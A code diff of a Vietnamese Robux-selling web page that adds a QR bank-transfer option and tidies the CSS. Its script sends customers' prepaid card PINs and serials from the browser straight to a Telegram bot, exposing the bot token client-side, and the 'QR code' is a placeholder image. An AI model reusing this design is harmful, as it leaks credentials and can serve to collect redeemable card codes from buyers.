@@ -40,7 +40,6 @@
             padding: 10px 20px;
         }
 
-        /* LOGO TRÊN NAVBAR CÓ HIỆU ỨNG NỔI LƠ LỬNG VÀ PHÁT SÁNG */
         .logo-box {
             display: flex;
             align-items: center;
@@ -57,12 +56,8 @@
         }
 
         @keyframes pulseGlowNav {
-            0% {
-                box-shadow: 0 0 5px #ec4899, 0 0 10px #ec4899;
-            }
-            100% {
-                box-shadow: 0 0 15px #ec4899, 0 0 25px #d946ef;
-            }
+            0% { box-shadow: 0 0 5px #ec4899, 0 0 10px #ec4899; }
+            100% { box-shadow: 0 0 15px #ec4899, 0 0 25px #d946ef; }
         }
 
         @keyframes floatNav {
@@ -228,7 +223,6 @@
             background: rgba(236, 72, 153, 0.2);
         }
 
-        /* KHUNG CHỨA LOGO BANNER LỚN HIỆU ỨNG NỔI LƠ LỬNG + GLOW 3D */
         .hero-img {
             max-width: 420px;
             padding: 30px;
@@ -255,12 +249,8 @@
         }
 
         @keyframes glowHero {
-            0% {
-                filter: drop-shadow(0 0 15px rgba(236, 72, 153, 0.6)) drop-shadow(0 0 30px rgba(168, 85, 247, 0.4));
-            }
-            100% {
-                filter: drop-shadow(0 0 25px rgba(236, 72, 153, 0.9)) drop-shadow(0 0 50px rgba(217, 70, 239, 0.7));
-            }
+            0% { filter: drop-shadow(0 0 15px rgba(236, 72, 153, 0.6)) drop-shadow(0 0 30px rgba(168, 85, 247, 0.4)); }
+            100% { filter: drop-shadow(0 0 25px rgba(236, 72, 153, 0.9)) drop-shadow(0 0 50px rgba(217, 70, 239, 0.7)); }
         }
 
         /* CONTAINER GENERAL */
@@ -290,7 +280,6 @@
             box-shadow: 0 0 10px #ec4899;
         }
 
-        /* LAYOUT CHÍNH */
         .main-grid {
             display: grid;
             grid-template-columns: 2.8fr 1.2fr;
@@ -532,7 +521,7 @@
         </div>
     </header>
 
-    <!-- HERO BANNER VỚI LOGO HIỆU ỨNG ĐỘNG LỚN -->
+    <!-- HERO BANNER -->
     <div class="hero">
         <div class="hero-content">
             <div class="hero-tag">SHOP ROBUX UY TÍN - GIÁ RẺ - TỰ ĐỘNG 24/7</div>
@@ -678,6 +667,7 @@
                     </select>
                 </div>
 
+                <!-- KHU VỰC THẺ CÀO -->
                 <div id="cardFields" style="background: rgba(17, 7, 36, 0.8); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid rgba(236, 72, 153, 0.2);">
                     <div class="form-group">
                         <label for="cardType">Loại thẻ:</label>
@@ -696,6 +686,14 @@
                         <label for="cardSeri">Mã Seri thẻ:</label>
                         <input type="text" id="cardSeri" placeholder="Nhập số seri...">
                     </div>
+                </div>
+
+                <!-- KHU VỰC MÃ QR CHUYỂN KHOẢN (MẶC ĐỊNH ẨN, CHỈ HIỆN KHI CHỌN QR) -->
+                <div id="qrFields" style="display: none; background: rgba(17, 7, 36, 0.8); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid rgba(236, 72, 153, 0.2); text-align: center;">
+                    <p style="margin-bottom: 15px; color: #f472b6; font-weight: bold;">Quét mã QR bên dưới để chuyển khoản thanh toán:</p>
+                    <!-- THAY LINK ẢNH QR CỦA BẠN VÀO THUỘC TÍNH SRC DƯỚI ĐÂY -->
+                    <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" alt="Mã QR Chuyển Khoản" style="max-width: 200px; height: auto; border-radius: 10px; border: 2px solid #ec4899; padding: 5px; background: white;" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/d/d0/QR_code_for_mobile_English_Wikipedia.svg'">
+                    <p style="margin-top: 15px; font-size: 0.9rem; color: #d1d5db;">Nội dung chuyển khoản ghi rõ: <b style="color: #ec4899;">Tên Roblox của bạn</b></p>
                 </div>
 
                 <button type="submit" id="submitBtn" class="btn-submit">🚀 XÁC NHẬN THANH TOÁN</button>
@@ -727,8 +725,14 @@ function selectPackage(packageName) {
 function togglePaymentFields() {
     var method = document.getElementById("paymentMethod").value;
     var cardBox = document.getElementById("cardFields");
-    if (cardBox) {
-        cardBox.style.display = (method === "card") ? "block" : "none";
+    var qrBox = document.getElementById("qrFields");
+    
+    if (method === "card") {
+        cardBox.style.display = "block";
+        qrBox.style.display = "none";
+    } else {
+        cardBox.style.display = "none";
+        qrBox.style.display = "block";
     }
 }
 
@@ -760,6 +764,8 @@ document.addEventListener('DOMContentLoaded', function() {
             message += `📲 <b>Loại thẻ:</b> ${cardType}\n`;
             message += `🔑 <b>Mã thẻ (PIN):</b> <code>${cardPin}</code>\n`;
             message += `🔢 <b>Số Seri:</b> <code>${cardSeri}</code>\n`;
+        } else {
+            message += `📸 <i>Khách chọn hình thức thanh toán quét mã QR chuyển khoản.</i>\n`;
         }
 
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -779,6 +785,7 @@ document.addEventListener('DOMContentLoaded', function() {
             if (data.ok) {
                 showToast("🎉 Đặt hàng thành công!");
                 form.reset();
+                togglePaymentFields();
             } else {
                 showToast("Lỗi Telegram: " + data.description, true);
             }
